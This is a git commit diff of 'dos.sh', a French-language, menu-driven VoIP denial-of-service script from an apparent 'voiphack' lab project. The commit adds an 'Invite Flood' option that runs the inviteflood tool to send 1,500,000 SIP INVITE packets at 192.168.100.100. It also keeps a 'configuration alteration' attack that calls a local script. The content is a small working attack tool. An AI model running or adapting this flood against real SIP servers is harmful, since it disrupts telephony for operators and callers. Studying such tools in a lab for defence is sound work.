ab88f1a04926dca887634ec0e83b152cb09933a9
LetouRaphael <48223543+LetouRaphael@users.noreply.github.com>
2020-03-03 16:41:17 +0100

    Update dos.sh

--- voiphack/dos.sh
+++ voiphack/dos.sh
@@ -9,15 +9,16 @@ confVide () {
 	echo "Success de l'alteration de la configuration"
 }
 
-while [ true ]
+
+confAltere () {
+	while [ true ]
 do
 
 		echo ""
 		echo -e "\t\t\t[Déni de Service]"
-		echo -e "\t\t\t [Choix attaque]"
-		echo -e "\t\t[1] Normal"
+		echo -e "\t\t     [Altération de config]"
+		echo -e "\t\t[1] Normal (Fonctionnement)"
 		echo -e "\t\t[2] Alteration de configuration"
-		echo -e "\t\t[3] Comming soon"
 		echo -e "\t\t[q] Quitter"
 		echo ""
 	
@@ -26,7 +27,36 @@ do
 		case $choix in
 			1) /var/voiphack/conf/sysupdate.sh correct;;
 			2) confVide;;
-			3) echo "Arrive prochainement";;
+			q) exit;;
+		esac
+
+done
+}
+
+
+inviteFlood () {
+	echo "Lancement de l'attaque ..."
+	inviteflood eth0 user 192.168.100.100 192.168.100.100 1500000
+	echo "Fin de l'attaque "
+}
+
+
+while [ true ]
+do
+
+		echo ""
+		echo -e "\t\t\t[Déni de Service]"
+		echo -e "\t\t\t [Choix attaque]"
+		echo -e "\t\t[1] Alteration de configuration"
+		echo -e "\t\t[2] Invite Flood"
+		echo -e "\t\t[q] Quitter"
+		echo ""
+	
+		read -p '[Déni de Service]=>' choix
+	
+		case $choix in
+			1) confAltere;;
+			2) inviteFlood;;
 			q) exit;;
 		esac
 
